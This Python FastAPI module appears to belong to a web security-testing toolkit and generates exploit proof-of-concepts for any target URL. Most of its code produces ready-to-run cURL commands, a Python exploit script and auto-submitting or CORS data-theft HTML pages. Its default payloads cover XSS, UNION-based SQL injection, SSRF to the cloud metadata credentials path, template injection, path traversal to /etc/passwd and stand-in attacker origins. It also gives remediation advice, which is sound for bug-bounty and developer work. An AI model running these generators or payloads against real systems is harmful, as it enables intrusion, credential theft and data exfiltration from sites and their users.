"""
Exploit PoC Generator — Instant Proof-of-Concept & Reproduction Synthesizer.
Inspired by Strix's core philosophy of Verified Findings & Reproducible Proof-of-Concepts (PoCs).
Generates ready-to-run cURL commands, standalone Python exploit scripts, interactive HTML PoCs,
and framework-specific remediation patches for developers.
"""
from __future__ import annotations
import urllib.parse
from typing import Dict, Any
from fastapi import APIRouter
from pydantic import BaseModel
from tools.utils import clean_url, f, ok, err

router = APIRouter(tags=["exploitation"])


class PocRequest(BaseModel):
    vuln_type: str = "xss"      # xss | sqli | ssrf | ssti | cors | open_redirect | lfi | proto
    target: str = "https://example.com/search"
    parameter: str = "q"
    custom_payload: str = ""
    http_method: str = "GET"


DEFAULT_PAYLOADS = {
    "xss": "<script>alert(document.domain)</script>",
    "sqli": "' UNION SELECT 1,version(),user(),4-- -",
    "ssrf": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "ssti": "{{7*7}}",
    "cors": "https://evil-attacker.com",
    "open_redirect": "https://attacker.com",
    "lfi": "../../../../etc/passwd",
    "proto": "__proto__[polluted]=true",
}


def build_curl(target: str, param: str, payload: str, method: str) -> str:
    encoded_payload = urllib.parse.quote(payload)
    if method.upper() == "POST":
        return f"""curl -i -s -k -X POST "{target}" \\
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "{param}={encoded_payload}\""""
    else:
        delim = "&" if "?" in target else "?"
        return f"""curl -i -s -k "{target}{delim}{param}={encoded_payload}" \\
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" """


def build_python_script(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
    script = f'''#!/usr/bin/env python3
"""
Automated Exploit Proof of Concept (PoC)
Vulnerability: {vuln_type.upper()}
Target: {target}
Parameter: {param}
"""
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "{target}"
PARAM = "{param}"
PAYLOAD = """{payload}"""
METHOD = "{method.upper()}"

headers = {{
    "User-Agent": "Mozilla/5.0 (BugBounty-PoC-Runner/1.0)",
    "Accept": "*/*",
}}

print(f"[*] Sending {vuln_type.upper()} exploit to {{TARGET}}...")

try:
    if METHOD == "POST":
        data = {{PARAM: PAYLOAD}}
        res = requests.post(TARGET, data=data, headers=headers, verify=False, timeout=10)
    else:
        params = {{PARAM: PAYLOAD}}
        res = requests.get(TARGET, params=params, headers=headers, verify=False, timeout=10)

    print(f"[+] HTTP Status: {{res.status_code}}")
    print(f"[+] Response Length: {{len(res.text)}} bytes")

    # Verification inspection
    if PAYLOAD in res.text:
        print("[✓] SUCCESS: Payload reflected directly in response body!")
    elif res.status_code == 200:
        print("[✓] Request completed successfully with HTTP 200.")
    print("\\n--- Response Preview (First 300 chars) ---")
    print(res.text[:300])

except Exception as err:
    print(f"[-] Execution failed: {{err}}")
'''
    return script


def build_html_poc(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
    if vuln_type == "cors":
        return f'''<!DOCTYPE html>
<html>
<head><title>CORS Data Theft PoC</title></head>
<body>
  <h2>CORS Exploit Demonstration</h2>
  <button onclick="steal()">Exfiltrate Private Data</button>
  <pre id="log" style="background:#1e1e2e; color:#a6e3a1; padding:15px; border-radius:8px;"></pre>
  <script>
    function steal() {{
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "{target}", true);
      xhr.withCredentials = true;
      xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
          document.getElementById("log").innerText = xhr.responseText;
        }}
      }};
      xhr.send();
    }}
  </script>
</body>
</html>'''

    return f'''<!DOCTYPE html>
<html>
<head><title>{vuln_type.upper()} Browser PoC</title></head>
<body>
  <h2>{vuln_type.upper()} Form Auto-Submit Exploit</h2>
  <form id="exploitForm" action="{target}" method="{method.upper()}">
    <input type="hidden" name="{param}" value="{payload}" />
  </form>
  <p>Triggering automatic request submission...</p>
  <script>
    document.getElementById("exploitForm").submit();
  </script>
</body>
</html>'''


def build_remediation(vuln_type: str) -> str:
    remediations = {
        "xss": "Contextually encode user input before rendering into HTML. In modern frameworks, use templating auto-escaping (React JSX, Angular) and set Content-Security-Policy: default-src 'self'.",
        "sqli": "Use parameterized prepared statements with bind variables. Never concatenate user variables into SQL queries (e.g., cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))).",
        "ssrf": "Implement an allowlist of permitted destination domains/IPs. Restrict server egress traffic, block RFC1918 private subnets and 169.254.169.254, and enforce IMDSv2 token headers.",
        "ssti": "Never pass user input into Template() render functions. Treat user input as template context variables, or use logic-less templating engines with sandboxing enabled.",
        "cors": "Specify explicit trusted origins in Access-Control-Allow-Origin. Never blindly echo the incoming Origin header when Access-Control-Allow-Credentials is true.",
        "open_redirect": "Validate redirect URLs against a whitelist of relative paths or strictly approved domains. Avoid taking unconstrained redirect targets from query parameters.",
        "lfi": "Avoid using user input in file system operations. Sanitize filenames with os.path.basename(), validate against a directory allowlist, or reference files by a lookup ID instead of path.",
        "proto": "Freeze Object.prototype via Object.freeze(Object.prototype), use Map or Object.create(null) for dictionary storage, and use safe JSON parsers.",
    }
    return remediations.get(vuln_type, "Implement strict input validation, principle of least privilege, and context-specific output encoding.")


@router.post("/poc_generator")
async def poc_generator(req: PocRequest):
    url = clean_url(req.target)
    v_type = req.vuln_type.lower().strip()
    param = req.parameter.strip() or "q"
    payload = req.custom_payload.strip() or DEFAULT_PAYLOADS.get(v_type, "<script>alert(1)</script>")
    method = req.http_method.upper().strip() or "GET"

    curl_code = build_curl(url, param, payload, method)
    python_code = build_python_script(url, param, payload, method, v_type)
    html_code = build_html_poc(url, param, payload, method, v_type)
    remediation_text = build_remediation(v_type)

    findings = [
        f(
            "info",
            f"Synthesized PoC for {v_type.upper()}",
            f"Target: {url} | Parameter: {param} | Method: {method}",
            remediation_text
        )
    ]

    records = [
        {"Artifact": "cURL Command", "Format": "Shell / Terminal", "Ready": "✓ Ready to Execute"},
        {"Artifact": "Python Exploit Script", "Format": "Python 3 + requests", "Ready": "✓ Ready to Run"},
        {"Artifact": "Interactive HTML PoC", "Format": "HTML / JavaScript", "Ready": "✓ Browser Ready"},
        {"Artifact": "Remediation Patch", "Format": "Best Practices Guide", "Ready": "✓ Ready for Devs"},
    ]

    combined_output = f"""=======================================================
[+] 1. REPRODUCTION cURL COMMAND
=======================================================
{curl_code}

=======================================================
[+] 2. STANDALONE PYTHON EXPLOIT SCRIPT
=======================================================
{python_code}

=======================================================
[+] 3. BROWSER HTML PROOF OF CONCEPT
=======================================================
{html_code}

=======================================================
[+] 4. DEVELOPER REMEDIATION GUIDELINE
=======================================================
{remediation_text}
"""

    return ok({
        "summary": {
            "Vulnerability": v_type.upper(),
            "Target URL": url,
            "Target Parameter": param,
            "HTTP Method": method,
            "PoC Artifacts Generated": 4,
        },
        "findings": findings,
        "records": records,
        "record_columns": ["Artifact", "Format", "Ready"],
        "raw": combined_output
    })
